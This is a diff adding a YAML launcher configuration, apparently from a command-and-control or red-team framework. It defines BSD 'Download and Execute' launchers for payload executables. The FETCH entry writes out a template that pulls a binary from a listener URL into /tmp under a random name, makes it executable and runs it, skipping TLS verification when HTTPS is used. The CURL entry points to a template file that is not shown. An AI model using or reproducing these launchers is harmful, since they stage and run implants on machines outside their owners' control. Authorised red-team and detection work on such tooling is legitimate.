@@ -1,0 +1,38 @@
+---
+name: Default Example Launchers
+version: 0.8.0
+description: BSD launcher
+type: launcher
+launchers:
+  - name: "Download and Execute [BSD] [CURL]"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"] # Supported Payload Types. Available: [EXECUTABLE, DEBUG_EXECUTABLE, SHELLCODE, SERVICE, DLL]
+      arch: ["x64", "x86"] # Supported payload architectures. Available: [x64, x86]
+      platform: ["bsd"] # Supported platforms. Available: [windows, linux]
+    path: "template.multi.curl-exe.sh"
+    args:
+      - name: url
+      - name: randomBinName
+        jsFile: lib/arg.randomBinName.js
+      - name: filename
+        jsFn: |
+          `/tmp/${argumentsPluginInterface['randomBinName']}.bin`
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "-k" : " ";
+  - name: "Download and Execute [BSD] [FETCH]"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"] # Supported Payload Types. Available: [EXECUTABLE, DEBUG_EXECUTABLE, SHELLCODE, SERVICE, DLL]
+      arch: ["x64", "x86"] # Supported payload architectures. Available: [x64, x86]
+      platform: ["bsd"] # Supported platforms. Available: [windows, linux]
+    template: fetch %%isHTTPS%% "%%url%%" -o %%filename%% && chmod +x %%filename%% &&  %%filename%%
+    args:
+      - name: url
+      - name: randomBinName
+        jsFile: lib/arg.randomBinName.js
+      - name: filename
+        jsFn: |
+          `/tmp/${argumentsPluginInterface['randomBinName']}.bin`
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "--no-verify-hostname --no-verify-peer" : "";
